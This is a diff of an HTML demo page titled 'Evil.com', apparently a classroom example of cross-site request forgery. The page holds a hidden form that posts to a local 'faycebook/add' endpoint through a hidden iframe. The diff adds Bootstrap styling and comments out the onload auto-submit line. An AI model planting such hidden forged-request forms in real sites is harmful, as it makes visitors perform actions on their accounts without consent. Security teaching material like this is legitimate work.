@@ -1,10 +1,45 @@
 <html>
 <head>
   <title>Evil.com</title>
+
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.11.1/jquery.min.js"></script>
+  <!-- Latest compiled and minified CSS -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap.min.css">
+  <!-- Optional theme -->
+  <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/css/bootstrap-theme.min.css">
+  <link rel=stylesheet type=text/css href="{{ url_for('static', filename='starter-template.css') }}">
+  <!-- Latest compiled and minified JavaScript -->
+  <script src="//maxcdn.bootstrapcdn.com/bootstrap/3.2.0/js/bootstrap.min.js"></script>
 </head>
 <body>
-  <h1>I am an innocent website!</h1> 
-  <small>dat CSRF dou</small>
+  <div class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <div class="navbar-header">
+        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+          <span class="sr-only">Toggle navigation</span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+          <span class="icon-bar"></span>
+        </button>
+        <a class="navbar-brand" href="#">Evil.com</a>
+      </div>
+      <div class="collapse navbar-collapse">
+        <ul class="nav navbar-nav">
+          <li class="active"><a href="#">Innocence</a></li>
+          <li><a href="#about">Rainbows</a></li>
+          <li><a href="#contact">Lollipop</a></li>
+        </ul>
+      </div>
+    </div>
+  </div>
+
+  <div class="container">
+    <div class="starter-template">
+      <h1>I am just an innocent website.</h1>
+      <p class="lead">What is CSRF dou?</p>
+    </div>
+  </div>
+
   <form name="attackFaycebook" method="POST" id="attackFaycebook"
   action="http://localhost:5000/faycebook/add" target="hidden-form">
     <input type="hidden" name="date" value="2014-04-01T22:50:49.762475" />
@@ -20,7 +55,7 @@
   <iframe style="display:none" name="hidden-form"></iframe>
   <script type="text/javascript">
     window.onload = function() {
-      document.attackFaycebook.submit();
+      //document.attackFaycebook.submit();
     }
   </script>
 </body>
